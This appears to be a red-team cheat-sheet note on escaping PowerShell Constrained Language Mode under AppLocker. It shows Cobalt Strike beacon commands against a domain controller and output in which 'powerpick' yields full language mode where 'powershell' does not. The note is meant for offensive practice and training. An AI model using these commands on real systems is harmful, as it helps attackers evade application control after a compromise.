# PowerShell Constrained Language Mode
When AppLocker is enabled PowerShell is placed into Constrained Language Mode (CLM), which restricts it to core types.

## Show language mode of CLM
> $ExecutionContext.SessionState.LanguageMode

> beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode

Any AppLocker bypass can result in CLM bypass. Cobalt Strike has a `powerpick` command, which is an "unmanaged" implementation of tapping into a PowerShell runspace, without using `powershell.exe`.

```beacon
beacon> run hostname
dc-1

beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powershell [math]::Pow(2,10)
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ [math]::Pow(2,10)_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage

beacon> powerpick [math]::Pow(2,10)
1024
```


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```